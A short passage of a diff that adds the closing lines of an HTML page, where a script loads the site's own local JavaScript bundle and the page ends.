+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
